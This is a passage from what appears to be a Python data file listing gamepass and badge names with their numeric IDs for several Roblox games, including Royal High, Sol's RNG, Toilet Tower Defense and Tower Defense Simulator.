        VIP            = 'VIP!',             947426555,  'VIP'
        Lucky          = 'Lucky!',           923677450,  'Lucky'
        UltraLucky     = 'Ultra Lucky!',     924643143,  'Ultra_Lucky'
        CelestialLuck  = 'Celestial Luck!',  974931021,  'Celestial_Luck'
        Plus3Pets      = '+3 Pets!',         955414606,  'Plus_3_Pets'
        HyperDice      = 'Hyper Dice!',      923754964,  'Hyper_Dice'
        DoubleDice     = 'Double Dice!',     951531608,  'Double_Dice'
        DoubleCoins    = 'Double Coins!',    955430652,  'Double_Coins'
        HugeHunter     = 'Huge Hunter!',     966471470,  'Huge_Hunter'
        ShinyHunter    = 'Shiny Hunter!',    977188877,  'Shiny_Hunter'
        DiamondPrinter = 'Diamond Printer!', 1008933294, 'Diamond_Printer'
        RainbowRolling = 'Rainbow Rolling!', 1009157126, 'Rainbow_Rolling'
        SkillMaster    = 'Skill Master!',    1089231744, 'Skill_Master'
        # List Of Gamepasses
        listOfGamepasses = [VIP, Lucky, UltraLucky, CelestialLuck, Plus3Pets, HyperDice, DoubleDice, DoubleCoins, HugeHunter, ShinyHunter, DiamondPrinter, RainbowRolling, SkillMaster]
    class Badges:
        P                      = 'P',                          3587889778036452, 'P'
        E                      = 'E',                          513094477922687,  'E'
        T                      = 'T',                          2446810370554117, 'T'
        S                      = 'S',                          2632896258542796, 'S'
        G                      = 'G',                          3957160897472233, 'G'
        O                      = 'O',                          1244002859092897, 'O'
        RobloxWinterToken      = 'Roblox Winter Token!',       3275096128139364, 'Roblox_Winter_Token'
        RobloxWinterEliteToken = 'Roblox Winter Elite Token!', 3275096128139364, 'Roblox_Winter_Elite_Token'
        # List Of Badges
        listOfBadges = [P, E, T, S, G, O, RobloxWinterToken, RobloxWinterEliteToken]

class ProjectSlayers: # https://www.roblox.com/games/5956785391
    placeNames = 'Project Slayers', 'Project_Slayers', 'PS', 5956785391
    class Gamepasses:
        SealedBox                                   = 'Sealed Box',                                       15101943,  'Sealed_Box'
        MuzanSpawn                                  = 'Muzan Spawn',                                      17958345,  'Muzan_Spawn'
        TotalConcentrationandDemonprogressionviewer = 'Total Concentration and Demon progression viewer', 18589360,  'Total_Concentration_and_Demon_progression_viewer'
        DisableOrEnableSlayerCorpUniform            = 'Disable Or Enable Slayer Corp Uniform',            18710993,  'Disable_Or_Enable_Slayer_Corp_Uniform'
        GourdDurabilityViewer                       = 'Gourd Durability Viewer',                          19241624,  'Gourd_Durability_Viewer'
        MoreEyesOptions                             = 'More Eyes Options',                                19270529,  'More_Eyes_Options'
        MoreFacialAccessoriesOptions                = 'More Facial Accessories Options',                  19270563,  'More_Facial_Accessories_Options'
        SetSpawnAnywhere                            = 'Set Spawn Anywhere',                               19300397,  'Set_Spawn_Anywhere'
        UrokodakisMask                              = 'Urokodaki\'s Mask',                                19340032,  'Urokodakis_Mask'
        MoreCharacterSlots                          = 'More Character Slots',                             19426240,  'More_Character_Slots'
        PrivateServers                              = 'Private Servers',                                  19516845,  'Private_Servers'
        CrowCustomization                           = 'Crow Customization',                               21698004,  'Crow_Customization'
        SkipSpin                                    = 'Skip Spin',                                        46503236,  'Skip_Spin'
        EmotePack                                   = 'Emote Pack',                                       42670615,  'Emote_Pack'
        EmotePack2                                  = 'Emote Pack 2',                                     178295110, 'Emote_Pack_2'
        ExtraEquipmentLoadouts                      = 'Extra Equipment Loadouts',                         181954095, 'Extra_Equipment_Loadouts'
        RobloxAvatar                                = 'Roblox Avatar',                                    16864938,  'Roblox_Avatar'
        # List Of Gamepasses
        listOfGamepasses = [SealedBox, MuzanSpawn, TotalConcentrationandDemonprogressionviewer, DisableOrEnableSlayerCorpUniform, GourdDurabilityViewer, MoreEyesOptions, MoreFacialAccessoriesOptions, SetSpawnAnywhere, UrokodakisMask, MoreCharacterSlots, PrivateServers, CrowCustomization, SkipSpin, EmotePack, EmotePack2, ExtraEquipmentLoadouts, RobloxAvatar]

class Rivals: # https://www.roblox.com/games/71874690745115
    placeNames = 'Rivals', 'Rivals', 'Ri', 71874690745115
    class Gamepasses:
        EnergyBundle          = 'Energy Bundle!',           977061826,  'Energy_Bundle'
        StarterBundle         = 'Starter Bundle!',          839491390,  'Starter_Bundle'
        StandardWeaponsBundle = 'Standard Weapons Bundle!', 838203071,  'Standard_Weapons_Bundle'
        HeavyDutyBundle       = 'Heavy Duty Bundle!',       838198043,  'Heavy_Duty_Bundle'
        ClassicBundle         = 'Classic Bundle!',          838160059,  'Classic_Bundle'
        ExogunBundle          = 'Exogun Bundle!',           838087219,  'Exogun_Bundle'
        MedkitBundle          = 'Medkit Bundle!',           837904767,  'Medkit_Bundle'
        PixelBundle           = 'Pixel Bundle!',            938353691,  'Pixel_Bundle'
        RPGBundle             = 'RPG Bundle!',              1162134376, 'RPG_Bundle'
        # List Of Gamepasses
        listOfGamepasses = [EnergyBundle, StarterBundle, StandardWeaponsBundle, HeavyDutyBundle, ClassicBundle, ExogunBundle, MedkitBundle, PixelBundle, RPGBundle]
    class Badges:
        Welcome     = 'Welcome!',      2904819966736756, 'Welcome'
        AlphaTester = 'Alpha Tester!', 1330297521556384, 'Alpha_Tester'
        # List Of Badges
        listOfBadges = [Welcome, AlphaTester]

class RoyalHigh: # https://www.roblox.com/games/735030788
    placeNames = 'Royal High', 'Royal_High', 'RH', 735030788
    class Gamepasses:
        FasterFlight                     = 'Faster Flight!',                     3436552,   'Faster_Flight'
        x2DoubleDiamonds                 = '2x Double Diamonds!',                3455446,   '2x_Double_Diamonds'
        x4QuadrupleDiamonds              = '4x Quadruple Diamonds!',             3457593,   '4x_Quadruple_Diamonds'
        PaintbrushPass                   = 'Paintbrush Pass!',                   3457412,   'Paintbrush_Pass'
        NewHairColorsPlusGLOWINGHairPass = 'New Hair Colors +GLOWING Hair Pass', 4097864,   'New_Hair_Colors_Plus_GLOWING_Hair_Pass'
        FlyonEarth                       = 'Fly on Earth!',                      5350675,   'Fly_on_Earth'
        SpecialFabricDesigns             = 'Special Fabric Designs',             5585682,   'Special_Fabric_Designs'
        UploadCustomFabricsPass          = 'Upload Custom Fabrics Pass!',        785128363, 'Upload_Custom_Fabrics_Pass'
        CrystalBallPower                 = 'Crystal Ball Power',                 6316501,   'Crystal_Ball_Power'
        StickerPacksPass                 = 'Sticker Packs Pass!',                10111433,  'Sticker_Packs_Pass'
        MaterialsPass                    = 'Materials Pass!',                    982344484, 'Materials_Pass'
        # List Of Gamepasses
        listOfGamepasses = [FasterFlight, x2DoubleDiamonds, x4QuadrupleDiamonds, PaintbrushPass, NewHairColorsPlusGLOWINGHairPass, FlyonEarth, SpecialFabricDesigns, UploadCustomFabricsPass, CrystalBallPower, StickerPacksPass, MaterialsPass]
    class Badges:
        RoyaleChristmas2019                     = 'Royale Christmas 2019!',                          2124498675,       'Royale_Christmas_2019'
        HappyNewYearswithRoyaleHigh2020         = 'Happy New Years with Royale High 2020!',          2124500186,       'Happy_New_Years_with_Royale_High_2020'
        RoyaleValentinesDay2020                 = 'Royale Valentines Day 2020!',                     2124509827,       'Royale_Valentines_Day_2020'
        SaintPatricksDay2019                    = 'Saint Patrick\'s Day 2019!',                      2124459883,       'Saint_Patricks_Day_2019'
        SaintPatricksDay2020                    = 'Saint Patrick\'s Day 2020!',                      2124517063,       'Saint_Patricks_Day_2020'
        RoyaleGlitterfrost2023                  = 'Royale Glitterfrost 2023!',                       410317500135558,  'Royale_Glitterfrost_2023'
        AdventCalendar2023Completionist         = 'Advent Calendar 2023 Completionist!',             946888967668846,  'Advent_Calendar_2023_Completionist'
        PumpkinContest2018                      = 'Pumpkin Contest 2018',                            2124428491,       'Pumpkin_Contest_2018'
        Halloween2018                           = 'Halloween 2018',                                  2124428509,       'Halloween_2018'
        Halloween2019DesignerEventCompletionist = 'Halloween 2019 Designer Event Completionist!',    2124487935,       'Halloween_2019_Designer_Event_Completionist'
        RoyaleHighHalloween2019                 = 'Royale High Halloween 2019!',                     2124490533,       'Royale_High_Halloween_2019'
        CompletedSuperHardMaze2019              = 'Completed Super Hard Maze 2019',                  2124490534,       'Completed_Super_Hard_Maze_2019'
        BeattheSuperScaryMaze2023               = 'Beat the Super Scary Maze 2023!',                 2152604997,       'Beat_the_Super_Scary_Maze_2023'
        BeattheSuperScaryMaze2025               = 'Beat the Super Scary Maze 2025!',                 4025403312692129, 'Beat_the_Super_Scary_Maze_2025'
        Royalloween2023                         = 'Royalloween 2023!',                               2152604993,       'Royalloween_2023'
        Royalloween2024                         = 'Royalloween 2024!',                               2559633734876320, 'Royalloween_2024'
        Royalloween2025                         = 'Royalloween 2025!',                               3494963190309092, 'Royalloween_2025'
        TopLeaderboardContributor2023           = 'Top Leaderboard Contributor! 2023',               2150899389,       'Top_Leaderboard_Contributor_2023'
        TopLeaderboardContributor2024           = 'Top Leaderboard Contributor! 2024',               2828451204247516, 'Top_Leaderboard_Contributor_2024'
        TopLeaderboardContributor2025           = 'Top Leaderboard Contributor! 2025',               1974333512672108, 'Top_Leaderboard_Contributor_2025'
        PurchasedAllGoddessofTriumphItems2023   = 'Purchased All Goddess of Triumph Items! 2023',    2150899380,       'Purchased_All_Goddess_of_Triumph_Items_2023'
        PurchasedAllGoddessofTriumphItems2024   = 'Purchased All Goddess of Triumph Items! 2024',    4117382963595102, 'Purchased_All_Goddess_of_Triumph_Items_2024'
        PurchasedaPiecefromGoddessofTriumph2024 = 'Purchased a Piece from Goddess of Triumph! 2024', 3500868758609792, 'Purchased_a_Piece_from_Goddess_of_Triumph_2024'
        # List Of Badges
        listOfBadges = [RoyaleChristmas2019, HappyNewYearswithRoyaleHigh2020, RoyaleValentinesDay2020, SaintPatricksDay2019, SaintPatricksDay2020, RoyaleGlitterfrost2023, AdventCalendar2023Completionist, PumpkinContest2018, Halloween2018, Halloween2019DesignerEventCompletionist, RoyaleHighHalloween2019, CompletedSuperHardMaze2019, BeattheSuperScaryMaze2023, BeattheSuperScaryMaze2025, Royalloween2023, Royalloween2024, Royalloween2025, TopLeaderboardContributor2023, TopLeaderboardContributor2024, TopLeaderboardContributor2025, PurchasedAllGoddessofTriumphItems2023, PurchasedAllGoddessofTriumphItems2024, PurchasedaPiecefromGoddessofTriumph2024]

class SolsRNG: # https://www.roblox.com/games/15532962292
    placeNames = 'Sol\'s RNG', 'Sols_RNG', 'SRNG', 15532962292
    class Gamepasses:
        RNGPremiumPassSeasonI  = 'RNG Premium Pass - Season I',  1240677143,  'RNG_Premium_Pass_Season_I'
        RNGPremiumPassSeasonII = 'RNG Premium Pass - Season II', 1418075511,  'RNG_Premium_Pass_Season_II'
        VIP                    = 'VIP',                          705238616,   'VIP'
        VIPPlus                = 'VIP+',                         952898058,   'VIP_Plus'
        StarterPack            = 'Starter Pack',                 1367756732,  'Starter_Pack'
        QuickRoll              = 'Quick Roll',                   673353863,   'Quick_Roll'
        InvisibleGear          = 'Invisible Gear',               792728808,   'Invisible_Gear'
        MerchantTeleporter     = 'Merchant Teleporter',          879770191,   'Merchant_Teleporter'
        InnovatorPackVol1      = 'Innovator Pack Vol 1',         958699822,   'Innovator_Pack_Vol_1'
        InnovatorPackVol2      = 'Innovator Pack Vol 2',         958340231,   'Innovator_Pack_Vol_2'
        InnovatorPackVol3      = 'Innovator Pack Vol 3',         958598071,   'Innovator_Pack_Vol_3'
        # List Of Gamepasses
        listOfGamepasses = [RNGPremiumPassSeasonI, RNGPremiumPassSeasonII, VIP, VIPPlus, StarterPack, QuickRoll, InvisibleGear, MerchantTeleporter, InnovatorPackVol1, InnovatorPackVol2, InnovatorPackVol3]
    class Badges:
        IjuststartedSolsRNG     = 'I just started Sol\'s RNG',        1441130719000460, 'I_just_started_Sols_RNG'
        Alittlebitofrolls       = 'A little bit of rolls',            3622512718465802, 'A_little_bit_of_rolls'
        ImaddictedtoSolsRNG     = 'I\'m addicted to Sol\'s RNG',      1107034638377762, 'Im_addicted_to_Sols_RNG'
        WouldYouLeaveNahIdRoll  = 'Would You Leave? / Nah I\'d Roll', 846169662502095,  'Would_You_Leave_Nah_Id_Roll'
        RollEatSleepRepeat      = 'Roll, Eat, Sleep, Repeat',         1872289370492358, 'Roll_Eat_Sleep_Repeat'
        Takeabreak              = 'Take a break',                     1092603390197325, 'Take_a_break'
        Icantstopplayingthis    = 'I can\'t stop playing this',       2731678596419900, 'I_cant_stop_playing_this'
        Wasteoftime             = 'Waste of time',                    4356557421515611, 'Waste_of_time'
        Touchthegrass           = 'Touch the grass',                  3336758570255487, 'Touch_the_grass'
        SpottedtheSol           = 'Spotted the Sol',                  2201290015607347, 'Spotted_the_Sol'
        Indev                   = 'In-dev',                           1253153057071204, 'In_dev'
        Finishedworkfortoday    = 'Finished work for today',          257464335458276,  'Finished_work_for_today'
        Goodjobthisweektoo      = 'Good job this week too',           1918952643310114, 'Good_job_this_week_too'
        Asincereperson          = 'A sincere person',                 3145321935208607, 'A_sincere_person'
        Whenispayday            = 'When is payday???',                1496986902550849, 'When_is_payday'
        StarEgg                 = 'Star Egg',                         2270659814141729, 'Star_Egg'
        LockEgg                 = 'Lock Egg',                         559749433012559,  'Lock_Egg'
        Theresnowaytostopit     = 'There\'s no way to stop it!',      202360729284337,  'Theres_no_way_to_stop_it'
        Igivemylife             = 'I give my life...',                744944723444729,  'I_give_my_life'
        Eternaltime             = 'Eternal time...',                  4072147147623458, 'Eternal_time'
        Myeternaljourney        = 'My eternal journey',               1605629548712504, 'My_eternal_journey'
        Breakthrough            = 'Breakthrough',                     2925176588215112, 'Breakthrough'
        Breakthelimit           = 'Break the limit',                  1356271377596280, 'Break_the_limit'
        BreaktheSpace           = 'Break the Space',                  1858966971108205, 'Break_the_Space'
        BreaktheGalaxy          = 'Break the Galaxy',                 1849903315759188, 'Break_the_Galaxy'
        BreaktheReality         = 'Break the Reality',                3593181263483436, 'Break_the_Reality'
        PerfectAttendanceAward  = 'Perfect Attendance Award',         3718807305779124, 'Perfect_Attendance_Award'
        FlawsintheWorld         = '-Flaws in the World-',             2457971054390553, 'Flaws_in_the_World'
        OnewhostandsbeforeGod   = '-One who stands before God-',      3236492292509665, 'One_who_stands_before_God'
        TheUnknown              = '-The Unknown-',                    1503563480176545, 'The_Unknown'
        AchievementSlayer       = 'Achievement Slayer',               476770132708833,  'Achievement_Slayer'
        AchievementMaster       = 'Achievement Master',               1201821091232234, 'Achievement_Master'
        AchievementChampion     = 'Achievement Champion',             348376112222987,  'Achievement_Champion'
        TheStigma               = 'The Stigma',                       1896511924362574, 'The_Stigma'
        DAY100                  = '#DAY100',                          399984649890845,  'DAY100'
        Missioncomplete         = 'Mission complete!',                1105302727042025, 'Mission_complete'
        Excellentservice        = 'Excellent service',                4319723733895149, 'Excellent_service'
        Professionalhelper      = 'Professional helper',              2192515070354146, 'Professional_helper'
        Questmaster             = 'Quest master',                     3021901927162320, 'Quest_master'
        Questslayer             = 'Quest slayer',                     723035340044103,  'Quest_slayer'
        SecretTrade             = 'Secret Trade',                     2620948537626731, 'Secret_Trade'
        Biomeitself             = 'Biome itself',                     4224933102884595, 'Biome_itself'
        Famous                  = 'Famous!',                          4096899752944070, 'Famous'
        Grandmaster             = 'Grandmaster',                      2091741945674306, 'Grandmaster'
        Amemorytobeforgotten    = 'A memory to be forgotten',         3625566987462442, 'A_memory_to_be_forgotten'
        TheLost                 = 'The Lost',                         2460941940564506, 'The_Lost'
        TheLimbo                = 'The Limbo',                        179330822551495,  'The_Limbo'
        TheZero                 = 'The Zero',                         4370606648952666, 'The_Zero'
        PreSandWormSlayer       = 'Pre-Sand Worm Slayer',             978766174460625,  'Pre_Sand_Worm_Slayer'
        CrawlerSlayer           = 'Crawler Slayer',                   645141997675497,  'Crawler_Slayer'
        Millions10              = '10,000,000',                       137829805535621,  '10000000'
        Millions15              = '15,000,000',                       485557368787476,  '15000000'
        Millions20              = '20,000,000',                       1801598389006571, '20000000'
        Millions30              = '30,000,000',                       2295935762202367, '30000000'
        Millions50              = '50,000,000',                       2994269484017383, '50000000'
        Myfirst10MPlusfinding   = 'My first 10M+ finding',            1121298629065726, 'My_first_10M_Plus_finding'
        Myfirst100MPlusfinding  = 'My first 100M+ finding',           3516455555443766, 'My_first_100M_Plus_finding'
        Myfirst1BPlusfinding    = 'My first 1B+ finding',             1224551724339726, 'My_first_1B_Plus_finding'
        Dimensional             = 'Dimensional',                      26095976848236,   'Dimensional'
        Unnamed1                = '??? 1',                            734804938884338,  'Unnamed_1'
        Unnamed2                = '??? 2',                            807013057656632,  'Unnamed_2'
        Unnamed3                = '??? 3',                            1324193838431233, 'Unnamed_3'
        Unnamed4                = '??? 4',                            1352157690781028, 'Unnamed_4'
        Unnamed5                = '??? 5',                            1956542596523913, 'Unnamed_5'
        Unnamed6                = '??? 6',                            3137343012568311, 'Unnamed_6'
        Unnamed7                = '??? 7',                            3618488813178695, 'Unnamed_7'
        Unnamed8                = '??? 8',                            4100206722227429, 'Unnamed_8'
        # List Of Badges
        listOfBadges = [IjuststartedSolsRNG, Alittlebitofrolls, ImaddictedtoSolsRNG, WouldYouLeaveNahIdRoll, RollEatSleepRepeat, Takeabreak, Icantstopplayingthis, Wasteoftime, Touchthegrass, SpottedtheSol, Indev, Finishedworkfortoday, Goodjobthisweektoo, Asincereperson, Whenispayday, StarEgg, LockEgg, Theresnowaytostopit, Igivemylife, Eternaltime, Myeternaljourney, Breakthrough, Breakthelimit, BreaktheSpace, BreaktheGalaxy, BreaktheReality, PerfectAttendanceAward, FlawsintheWorld, OnewhostandsbeforeGod, TheUnknown, AchievementSlayer, AchievementMaster, AchievementChampion, TheStigma, DAY100, Missioncomplete, Excellentservice, Professionalhelper, Questmaster, Questslayer, SecretTrade, Biomeitself, Famous, Grandmaster, Amemorytobeforgotten, TheLost, TheLimbo, TheZero, PreSandWormSlayer, CrawlerSlayer, Millions10, Millions15, Millions20, Millions30, Millions50, Myfirst10MPlusfinding, Myfirst100MPlusfinding, Myfirst1BPlusfinding, Dimensional, Unnamed1, Unnamed2, Unnamed3, Unnamed4, Unnamed5, Unnamed6, Unnamed7, Unnamed8]

class StealaBrainrot: # https://www.roblox.com/games/109983668079237
    placeNames = 'Steal a Brainrot', 'Steal_a_Brainrot', 'SaB', 109983668079237
    class Gamepasses:
        AdminCommands = 'Admin Commands', 1227013099, 'Admin_Commands'
        VIP           = 'VIP',            1229510262, 'VIP'
        x2Money       = '2x Money',       1228591447, '2x_Money'
        # List Of Gamepasses
        listOfGamepasses = [AdminCommands, VIP, x2Money]

class ToiletTowerDefense: # https://www.roblox.com/games/13775256536
    placeNames = 'Toilet Tower Defense', 'Toilet_Tower_Defense', 'TTD', 13775256536
    class Gamepasses:
        VIP                       = 'VIP',                           257410325,  'VIP'
        Lucky                     = 'Lucky',                         208619622,  'Lucky'
        DoubleCoins               = 'Double Coins',                  208620375,  'Double_Coins'
        Plus1000InventoryStorage  = '+1000 Inventory Storage',       646799606,  'Plus_1000_Inventory_Storage'
        InfiniteUnits             = 'Infinite Units',                767749542,  'Infinite_Units'
        ClanCreator               = 'Clan Creator',                  897195671,  'Clan_Creator'
        x2Drills                  = '2x Drills',                     930624309,  '2x_Drills'
        ShinyHunter               = 'Shiny Hunter',                  952446306,  'Shiny_Hunter'
        TraitHunter               = 'Trait Hunter',                  1198051550, 'Trait_Hunter'
        SummerPassPremiumTrack    = 'Summer Pass: Premium Track',    1272594550, 'Summer_Pass_Premium_Track'
        DoubleLuckyToiletSpawning = 'Double Lucky Toilet Spawning!', 1105184340, 'Double_Lucky_Toilet_Spawning'
        # List Of Gamepasses
        listOfGamepasses = [VIP, Lucky, DoubleCoins, Plus1000InventoryStorage, InfiniteUnits, ClanCreator, x2Drills, ShinyHunter, TraitHunter, SummerPassPremiumTrack, DoubleLuckyToiletSpawning]
    class Badges:
        BeatEasyDifficulty           = 'Beat Easy Difficulty!',           2148808870,       'Beat_Easy_Difficulty'
        BeatMediumDifficulty         = 'Beat Medium Difficulty!',         2148808877,       'Beat_Medium_Difficulty'
        BeatHardDifficulty           = 'Beat Hard Difficulty!',           2148967266,       'Beat_Hard_Difficulty'
        BeatNightmareDifficulty      = 'Beat Nightmare Difficulty!',      2149510852,       'Beat_Nightmare_Difficulty'
        BeatAbysmalDifficulty        = 'Beat Abysmal Difficulty!',        205916089448424,  'Beat_Abysmal_Difficulty'
        BeatSecretEvilWave           = 'Beat Secret Evil Wave',           3269012098035529, 'Beat_Secret_Evil_Wave'
        TitanSpeakerman              = 'Titan Speakerman',                2148698556,       'Titan_Speakerman'
        TitanTVMan                   = 'Titan TV Man',                    2148967295,       'Titan_TV_Man'
        NinjaCameraman               = 'Ninja Cameraman',                 2149260235,       'Ninja_Cameraman'
        MechCameraman                = 'Mech Cameraman',                  2149529631,       'Mech_Cameraman'
        LaserCameramanCar            = 'Laser Cameraman Car',             2149898179,       'Laser_Cameraman_Car'
        SecretAgent                  = 'Secret Agent',                    2150077001,       'Secret_Agent'
        UpgradedTitanCameraman       = 'Upgraded Titan Cameraman',        2150356615,       'Upgraded_Titan_Cameraman'
        TitanCinemaman               = 'Titan Cinemaman',                 2150356638,       'Titan_Cinemaman'
        DarkSpeakerman               = 'Dark Speakerman',                 2150593479,       'Dark_Speakerman'
        UpgradedTitanSpeakerman      = 'Upgraded Titan Speakerman',       2150879473,       'Upgraded_Titan_Speakerman'
        DancingSpeakerwoman          = 'Dancing Speakerwoman',            2151779704,       'Dancing_Speakerwoman'
        GlitchCameraman              = 'Glitch Cameraman',                2153379585,       'Glitch_Cameraman'
        JetpackSpeakerman            = 'Jetpack Speakerman',              2153379588,       'Jetpack_Speakerman'
        UpgradedTitanCinemaman       = 'Upgraded Titan Cinemaman',        2502574037187648, 'Upgraded_Titan_Cinemaman'
        DualBatSpeakerman            = 'Dual Bat Speakerman',             4443545723157147, 'Dual_Bat_Speakerman'
        LargeLaserCameraman          = 'Large Laser Cameraman',           3045860093689297, 'Large_Laser_Cameraman'
        ShotgunCameraman             = 'Shotgun Cameraman',               2385641468984928, 'Shotgun_Cameraman'
        MinigunCamerawoman           = 'Minigun Camerawoman',             1233182747919466, 'Minigun_Camerawoman'
        KatanaSpeakerwoman           = 'Katana Speakerwoman',             2817031393332978, 'Katana_Speakerwoman'
        SpearSpeakerman              = 'Spear Speakerman',                1150879405352932, 'Spear_Speakerman'
        RedLaserCameraman            = 'Red Laser Cameraman',             931050305844465,  'Red_Laser_Cameraman'
        UpgradedMechCameraman        = 'Upgraded Mech Cameraman',         1115010233662541, 'Upgraded_Mech_Cameraman'
        MaceCamerawoman              = 'Mace Camerawoman',                1127660680344125, 'Mace_Camerawoman'
        ClockEvent                   = 'Clock Event',                     1630314579932289, 'Clock_Event'
        KnifeUpgradedTitanSpeakerman = 'Knife Upgraded Titan Speakerman', 4014008284565926, 'Knife_Upgraded_Titan_Speakerman'
        AstroGunCameraman            = 'Astro Gun Cameraman',             3721219248389823, 'Astro_Gun_Cameraman'
        SummerEvent2024              = 'Summer Event 2024',               2473445528937503, 'Summer_Event_2024'
        FinishedBeachBallHunt2024    = 'Finished Beach Ball Hunt 2024',   2247321279730360, 'Finished_Beach_Ball_Hunt_2024'
        BuffMutantToilet             = 'Buff Mutant Toilet',              1712380323524027, 'Buff_Mutant_Toilet'
        BeatDrillForest              = 'Beat Drill Forest',               1983663233025849, 'Beat_Drill_Forest'
        BeatDrillWorld               = 'Beat Drill World',                3719490798478354, 'Beat_Drill_World'
        BeatHalloweenGraveyard2024   = 'Beat Halloween Graveyard 2024',   2977453670049037, 'Beat_Halloween_Graveyard_2024'
        BeatThanksgivingTable        = 'Beat Thanksgiving Table',         1799362452924436, 'Beat_Thanksgiving_Table'
        BeatDiceWorld                = 'Beat Dice World',                 315021521983622,  'Beat_Dice_World'
        TheHatch                     = 'The Hatch!',                      1001707030871277, 'The_Hatch'
        # List Of Badges
        listOfBadges = [BeatEasyDifficulty, BeatMediumDifficulty, BeatHardDifficulty, BeatNightmareDifficulty, BeatAbysmalDifficulty, BeatSecretEvilWave, TitanSpeakerman, TitanTVMan, NinjaCameraman, MechCameraman, LaserCameramanCar, SecretAgent, UpgradedTitanCameraman, TitanCinemaman, DarkSpeakerman, UpgradedTitanSpeakerman, DancingSpeakerwoman, GlitchCameraman, JetpackSpeakerman, UpgradedTitanCinemaman, DualBatSpeakerman, LargeLaserCameraman, ShotgunCameraman, MinigunCamerawoman, KatanaSpeakerwoman, SpearSpeakerman, RedLaserCameraman, UpgradedMechCameraman, MaceCamerawoman, ClockEvent, KnifeUpgradedTitanSpeakerman, AstroGunCameraman, SummerEvent2024, FinishedBeachBallHunt2024, BuffMutantToilet, BeatDrillForest, BeatDrillWorld, BeatHalloweenGraveyard2024, BeatThanksgivingTable, BeatDiceWorld, TheHatch]

class TowerDefenseSimulator: # https://www.roblox.com/games/3260590327
    placeNames = 'Tower Defense Simulator', 'Tower_Defense_Simulator', 'TDS', 3260590327
    class Gamepasses:
        Test                  = 'Test',                    6808274,    'Test'
        SmallDonation         = 'Small Donation',          6680173,    'Small_Donation'
        CrookBoss             = 'Crook Boss',              6757455,    'Crook_Boss'
        Turret                = 'Turret',                  6935538,    'Turret'
        CustomMusic           = 'Custom Music',            7104817,    'Custom_Music'
        Mortar                = 'Mortar',                  7838041,    'Mortar'
        Pursuit               = 'Pursuit',                 9735384,    'Pursuit'
        VIP                   = 'VIP',                     10518590,   'VIP'
        Hacker                = 'Hacker',                  1252103819, 'Hacker'
        MemeEmotes            = 'Meme Emotes',             11467931,   'Meme_Emotes'
        Sledger               = 'Sledger',                 13534631,   'Sledger'
        Executioner           = 'Executioner',             25711202,   'Executioner'
        Engineer              = 'Engineer',                40385775,   'Engineer'
        ResizeYourPlayer      = 'Resize Your Player!',     65949871,   'Resize_Your_Player'
        Cowboy                = 'Cowboy',                  90119024,   'Cowboy'
        Warden                = 'Warden',                  99570026,   'Warden'
        VigilanteSkinBundle   = 'Vigilante Skin Bundle',   193944933,  'Vigilante_Skin_Bundle'
        UnwaveringTidesBundle = 'Unwavering Tides Bundle', 224102025,  'Unwavering_Tides_Bundle'
        MercenaryBase         = 'Mercenary Base',          786591818,  'Mercenary_Base'
        GatlingGun            = 'Gatling Gun!',            924927232,  'Gatling_Gun'
        AdminMode             = 'Admin Mode',              1002808617, 'Admin_Mode'
        Slasher               = 'Slasher',                 7386135,    'Slasher'
        Gladiator             = 'Gladiator',               7656528,    'Gladiator'
        FrostBlasterTower     = 'Frost Blaster Tower',     7846530,    'Frost_Blaster_Tower'
        GiftOfJoy             = 'Gift Of Joy',             7846620,    'Gift_Of_Joy'
        GiftofMystery         = 'Gift of Mystery',         7846621,    'Gift_of_Mystery'
        GiftofSharp           = 'Gift of Sharp',           7846623,    'Gift_of_Sharp'
        FireworksEmote        = 'Fireworks Emote',         7913109,    'Fireworks_Emote'
        PartySkins            = 'Party Skins',             7913591,    'Party_Skins'
        AllEasterSkins        = 'All Easter Skins',        8868550,    'All_Easter_Skins'
        Swarmer               = 'Swarmer',                 8868555,    'Swarmer'
        ArcherTower           = 'Archer Tower',            8928263,    'Archer_Tower'
        ToxicGunner           = 'Toxic Gunner',            13534630,   'Toxic_Gunner'
        ElfCamp               = 'Elf Camp!',               112619685,  'Elf_Camp'
        Necromancer           = 'Necromancer',             643819691,  'Necromancer'
        JesterTower           = 'Jester Tower!',           652291181,  'Jester_Tower'
        CryomancerTower       = 'Cryomancer Tower',        674876666,  'Cryomancer_Tower'
        Harvester             = 'Harvester',               953808062,  'Harvester'
        HallowPunk            = 'Hallow Punk',             954430263,  'Hallow_Punk'
        Commando              = 'Commando',                977109244,  'Commando'
        Elementalist          = 'Elementalist',            1007556869, 'Elementalist'
        Snowballer            = 'Snowballer',              1007420790, 'Snowballer'
        Ignorethisgamepass    = 'Ignore this gamepass',    12511535,   'Ignore_this_gamepass'
        Biologist             = 'Biologist',               1160816963, 'Biologist'
        HelloWorld            = 'Hello World!',            1252451656, 'Hello_World'
        # List Of Gamepasses
        listOfGamepasses = [Test, SmallDonation, CrookBoss, Turret, CustomMusic, Mortar, Pursuit, VIP, Hacker, MemeEmotes, Sledger, Executioner, Engineer, ResizeYourPlayer, Cowboy, Warden, VigilanteSkinBundle, UnwaveringTidesBundle, MercenaryBase, GatlingGun, AdminMode, Slasher, Gladiator, FrostBlasterTower, GiftOfJoy, GiftofMystery, GiftofSharp, FireworksEmote, PartySkins, AllEasterSkins, Swarmer, ArcherTower, ToxicGunner, ElfCamp, Necromancer, JesterTower, CryomancerTower, Harvester, HallowPunk, Commando, Elementalist, Snowballer, Ignorethisgamepass, Biologist, HelloWorld]
    class Badges:
        WelcometoTDS           = 'Welcome to TDS!',           2124615656,       'Welcome_to_TDS'
        Level10                = 'Level 10',                  2124477834,       'Level_10'
        Level20                = 'Level 20',                  2124477835,       'Level_20'
        Level30                = 'Level 30',                  2124475816,       'Level_30'
        Level50                = 'Level 50',                  2124477836,       'Level_50'
        Level75                = 'Level 75',                  2124477837,       'Level_75'
        Level100               = 'Level 100',                 2124477838,       'Level_100'
        Level150               = 'Level 150',                 265315644206668,  'Level_150'
        DefeatedtheBrute       = 'Defeated the Brute',        4101345145774971, 'Defeated_the_Brute'
        DefeatGraveDigger      = 'Defeat Grave Digger',       2124572793,       'Defeat_Grave_Digger'
        DefeatMoltenWarlord    = 'Defeat Molten Warlord',     2124572794,       'Defeat_Molten_Warlord'
        DefeattheFallenKing    = 'Defeat the Fallen King',    2124615655,       'Defeat_the_Fallen_King'
        DefeatedNuclearMonster = 'Defeated Nuclear Monster!', 2127670181,       'Defeated_Nuclear_Monster'
        DefeatedGunslinger     = 'Defeated Gunslinger!',      2128794382,       'Defeated_Gunslinger'
        DefeatedWoxTheFox      = 'Defeated Wox The Fox!',     2129234537,       'Defeated_Wox_The_Fox'
